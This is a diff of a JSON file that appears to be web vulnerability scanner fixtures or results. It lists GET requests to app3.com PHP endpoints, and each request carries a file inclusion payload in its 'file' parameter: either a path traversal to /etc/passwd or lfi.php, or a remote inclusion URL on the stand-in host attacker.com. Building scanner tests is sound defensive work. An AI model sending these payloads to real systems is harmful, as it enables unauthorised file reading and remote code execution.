@@ -1,20 +1,116 @@
 [
   {
-    "url": "http://bm2.com/case2/bm.php", 
-    "action": "http://bm2.com/case2/bm.php", 
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/code.php", 
     "parameter": {
-      "username": "../../../../../../../../../../../../../../lfi", 
-      "null": ""
+      "lines": "lines", 
+      "file": "http://attacker.com/a.js"
     }, 
-    "method": "GET"
+    "method": "get"
   }, 
   {
-    "url": "http://bm2.com/case2/bm.php", 
-    "action": "http://bm2.com/case2/bm.php", 
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/code.php", 
     "parameter": {
-      "username": "../../../../../../../../../../../../../../lfi", 
-      "null": ""
+      "lines": "lines", 
+      "file": "../../../../../../../../../../../../../../etc/passwd"
     }, 
-    "method": "GET"
+    "method": "get"
+  }, 
+  {
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/code.php", 
+    "parameter": {
+      "lines": "lines", 
+      "file": "../../../../../../../../../../../../../lfi.php"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/code.php", 
+    "parameter": {
+      "lines": "lines", 
+      "file": "../../../../../../../../../../../../../../lfi.php"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/code.php", 
+    "parameter": {
+      "lines": "lines", 
+      "file": "http://attacker.com/a"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/code.php", 
+    "parameter": {
+      "lines": "lines", 
+      "file": "http://attacker.com/a.php"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/function.php", 
+    "parameter": {
+      "start": "start", 
+      "end": "end", 
+      "file": "http://attacker.com/a.js"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/function.php", 
+    "parameter": {
+      "start": "start", 
+      "end": "end", 
+      "file": "../../../../../../../../../../../../../../etc/passwd"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/function.php", 
+    "parameter": {
+      "start": "start", 
+      "end": "end", 
+      "file": "../../../../../../../../../../../../../lfi.php"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/function.php", 
+    "parameter": {
+      "start": "start", 
+      "end": "end", 
+      "file": "../../../../../../../../../../../../../../lfi.php"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/function.php", 
+    "parameter": {
+      "start": "start", 
+      "end": "end", 
+      "file": "http://attacker.com/a"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/function.php", 
+    "parameter": {
+      "start": "start", 
+      "end": "end", 
+      "file": "http://attacker.com/a.php"
+    }, 
+    "method": "get"
   }
 ]
